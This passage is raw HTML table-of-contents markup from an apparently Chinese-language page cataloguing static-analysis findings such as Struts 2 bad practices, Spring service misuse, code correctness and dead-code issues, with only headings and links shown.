<span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-Privilege-Management"><span class="toc-number">1.1.42.</span> <span class="toc-text">Often Misused: Privilege Management</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-40"><span class="toc-number">1.1.42.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-41"><span class="toc-number">1.1.42.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-41"><span class="toc-number">1.1.42.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-39"><span class="toc-number">1.1.42.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-Spring-Remote-Service"><span class="toc-number">1.1.43.</span> <span class="toc-text">Often Misused: Spring Remote Service</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-41"><span class="toc-number">1.1.43.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-42"><span class="toc-number">1.1.43.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-42"><span class="toc-number">1.1.43.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-40"><span class="toc-number">1.1.43.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-Spring-Web-Service"><span class="toc-number">1.1.44.</span> <span class="toc-text">Often Misused: Spring Web Service</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-42"><span class="toc-number">1.1.44.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-43"><span class="toc-number">1.1.44.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-43"><span class="toc-number">1.1.44.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-41"><span class="toc-number">1.1.44.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Explicit-Call-to-finalize"><span class="toc-number">1.1.45.</span> <span class="toc-text">Poor Style: Explicit Call to finalize()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-43"><span class="toc-number">1.1.45.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-44"><span class="toc-number">1.1.45.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-44"><span class="toc-number">1.1.45.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-42"><span class="toc-number">1.1.45.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Bad-Practices-Application-Map-Tampering"><span class="toc-number">1.1.46.</span> <span class="toc-text">Struts 2 Bad Practices: Application Map Tampering</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-44"><span class="toc-number">1.1.46.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-45"><span class="toc-number">1.1.46.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-45"><span class="toc-number">1.1.46.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-43"><span class="toc-number">1.1.46.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Bad-Practices-Dynamic-Method-Invocation"><span class="toc-number">1.1.47.</span> <span class="toc-text">Struts 2 Bad Practices: Dynamic Method Invocation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-45"><span class="toc-number">1.1.47.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-46"><span class="toc-number">1.1.47.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-46"><span class="toc-number">1.1.47.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-44"><span class="toc-number">1.1.47.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Bad-Practices-Request-Map-Tampering"><span class="toc-number">1.1.48.</span> <span class="toc-text">Struts 2 Bad Practices: Request Map Tampering</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-46"><span class="toc-number">1.1.48.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-47"><span class="toc-number">1.1.48.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-47"><span class="toc-number">1.1.48.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-45"><span class="toc-number">1.1.48.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-2-Bad-Practices-Session-Map-Tampering"><span class="toc-number">1.1.49.</span> <span class="toc-text">Struts 2 Bad Practices: Session Map Tampering</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-47"><span class="toc-number">1.1.49.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-48"><span class="toc-number">1.1.49.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-48"><span class="toc-number">1.1.49.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-46"><span class="toc-number">1.1.49.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unchecked-Return-Value"><span class="toc-number">1.1.50.</span> <span class="toc-text">Unchecked Return Value</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-48"><span class="toc-number">1.1.50.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-49"><span class="toc-number">1.1.50.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-49"><span class="toc-number">1.1.50.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-47"><span class="toc-number">1.1.50.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码质量"><span class="toc-number">1.2.</span> <span class="toc-text">代码质量</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Android-Bad-Practices-Use-of-Internal-APIs"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">Android Bad Practices: Use of Internal APIs</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-49"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-50"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-50"><span class="toc-number">1.2.0.4.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-48"><span class="toc-number">1.2.0.5.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Bad-Practices-Use-of-Released-Camera-Resource"><span class="toc-number">1.2.1.</span> <span class="toc-text">Android Bad Practices: Use of Released Camera Resource</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-50"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-51"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-51"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-49"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Bad-Practices-Use-of-Released-Media-Resource"><span class="toc-number">1.2.2.</span> <span class="toc-text">Android Bad Practices: Use of Released Media Resource</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-51"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-52"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-52"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-50"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Bad-Practices-Use-of-Released-SQLite-Resource"><span class="toc-number">1.2.3.</span> <span class="toc-text">Android Bad Practices: Use of Released SQLite Resource</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-52"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-53"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-53"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-51"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Byte-Array-to-String-Conversion"><span class="toc-number">1.2.4.</span> <span class="toc-text">Code Correctness: Byte Array to String Conversion</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-53"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-54"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-54"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-52"><span class="toc-number">1.2.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Call-to-Thread-run"><span class="toc-number">1.2.5.</span> <span class="toc-text">Code Correctness: Call to Thread.run()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-54"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-55"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-55"><span class="toc-number">1.2.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-56"><span class="toc-number">1.2.5.4.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-53"><span class="toc-number">1.2.5.5.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Erroneous-Zero-Value"><span class="toc-number">1.2.6.</span> <span class="toc-text">Code Correctness: Erroneous Zero Value</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-55"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-56"><span class="toc-number">1.2.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-57"><span class="toc-number">1.2.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-54"><span class="toc-number">1.2.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Hidden-Method"><span class="toc-number">1.2.7.</span> <span class="toc-text">Code Correctness: Hidden Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-56"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-57"><span class="toc-number">1.2.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-58"><span class="toc-number">1.2.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-55"><span class="toc-number">1.2.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Incorrect-serialPersistentFields-Modifier"><span class="toc-number">1.2.8.</span> <span class="toc-text">Code Correctness: Incorrect serialPersistentFields Modifier</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-57"><span class="toc-number">1.2.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-58"><span class="toc-number">1.2.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-59"><span class="toc-number">1.2.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-56"><span class="toc-number">1.2.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Invalid-Call-to-Object-equals"><span class="toc-number">1.2.9.</span> <span class="toc-text">Code Correctness: Invalid Call to Object.equals()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-58"><span class="toc-number">1.2.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-59"><span class="toc-number">1.2.9.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-60"><span class="toc-number">1.2.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-57"><span class="toc-number">1.2.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Misleading-Method-Signature"><span class="toc-number">1.2.10.</span> <span class="toc-text">Code Correctness: Misleading Method Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-59"><span class="toc-number">1.2.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-60"><span class="toc-number">1.2.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-61"><span class="toc-number">1.2.10.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-58"><span class="toc-number">1.2.10.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Non-Static-Inner-Class-Implements-Serializable"><span class="toc-number">1.2.11.</span> <span class="toc-text">Code Correctness: Non-Static Inner Class Implements Serializable</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-60"><span class="toc-number">1.2.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-61"><span class="toc-number">1.2.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-62"><span class="toc-number">1.2.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-59"><span class="toc-number">1.2.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Non-Synchronized-Method-Overrides-Synchronized-Method"><span class="toc-number">1.2.12.</span> <span class="toc-text">Code Correctness: Non-Synchronized Method Overrides Synchronized Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-61"><span class="toc-number">1.2.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-62"><span class="toc-number">1.2.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-63"><span class="toc-number">1.2.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-60"><span class="toc-number">1.2.12.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-String-Comparison-of-Float"><span class="toc-number">1.2.13.</span> <span class="toc-text">Code Correctness: String Comparison of Float</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-62"><span class="toc-number">1.2.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-63"><span class="toc-number">1.2.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-64"><span class="toc-number">1.2.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-61"><span class="toc-number">1.2.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-clone-Invokes-Overridable-Function"><span class="toc-number">1.2.14.</span> <span class="toc-text">Code Correctness: clone() Invokes Overridable Function</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-63"><span class="toc-number">1.2.14.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-64"><span class="toc-number">1.2.14.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-65"><span class="toc-number">1.2.14.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-62"><span class="toc-number">1.2.14.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-null-Argument-to-equals"><span class="toc-number">1.2.15.</span> <span class="toc-text">Code Correctness: null Argument to equals()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-64"><span class="toc-number">1.2.15.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-65"><span class="toc-number">1.2.15.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-66"><span class="toc-number">1.2.15.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-63"><span class="toc-number">1.2.15.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-readObject-Invokes-Overridable-Function"><span class="toc-number">1.2.16.</span> <span class="toc-text">Code Correctness: readObject() Invokes Overridable Function</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-65"><span class="toc-number">1.2.16.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-66"><span class="toc-number">1.2.16.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-67"><span class="toc-number">1.2.16.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-64"><span class="toc-number">1.2.16.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dead-Code-Empty-Try-Block"><span class="toc-number">1.2.17.</span> <span class="toc-text">Dead Code: Empty Try Block</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-66"><span class="toc-number">1.2.17.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-67"><span class="toc-number">1.2.17.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-68"><span class="toc-number">1.2.17.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-65"><span class="toc-number">1.2.17.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dead-Code-Expression-is-Always-false"><span class="toc-number">1.2.18.</span> <span class="toc-text">Dead Code: Expression is Always false</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-67"><span class="toc-number">1.2.18.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-68"><span class="toc-number">1.2.18.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-69"><span class="toc-number">1.2.18.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-66"><span class="toc-number">1.2.18.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dead-Code-Expression-is-Always-true"><span class="toc-number">1.2.19.</span> <span class="toc-text">Dead Code: Expression is Always true</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-68"><span class="toc-number">1.2.19.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-69"><span class="toc-number">1.2.19.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-70"><span class="toc-number">1.2.19.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-67"><span class="toc-number">1.2.19.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dead-Code-Unused-Field"><span class="toc-number">1.2.20.</span> <span class="toc-text">Dead Code: Unused Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-69"><span class="toc-number">1.2.20.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-70"><span class="toc-number">1.2.20.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-71"><span class="toc-number">1.2.20.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-68"><span class="toc-number">1.2.20.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dead-Code-Unused-Method"><span class="toc-number">1.2.21.</span> <span class="toc-text">Dead Code: Unused Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-70"><span class="toc-number">1.2.21.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-71"><span class="toc-number">1.2.21.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-72"><span class="toc-number">1.2.21.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-69"><span class="toc-number">1.2.21.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Null-Dereference"><span class="toc-number">1.2.22.</span> <span class="toc-text">Null Dereference</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-71"><span class="toc-number">1.2.22.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-72"><span class="toc-number">1.2.22.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-73"><span class="toc-number">1.2.22.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-70"><span class="toc-number">1.2.22.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Obsolete"><span class="toc-number">1.2.23.</span> <span class="toc-text">Obsolete</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-72"><span class="toc-number">1.2.23.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-73"><span class="toc-number">1.2.23.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-74"><span class="toc-number">1.2.23.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-71"><span class="toc-number">1.2.23.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Confusing-Naming-class-and-member"><span class="toc-number">1.2.24.</span> <span class="toc-text">Poor Style: Confusing Naming(class_and_member)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-73"><span class="toc-number">1.2.24.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-74"><span class="toc-number">1.2.24.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-75"><span class="toc-number">1.2.24.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-72"><span class="toc-number">1.2.24.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Poor-Style-Confusing-Naming-member-and-method"><span class="toc-number">1.2.25.</span> <span class="toc-text">Poor Style: Confusing 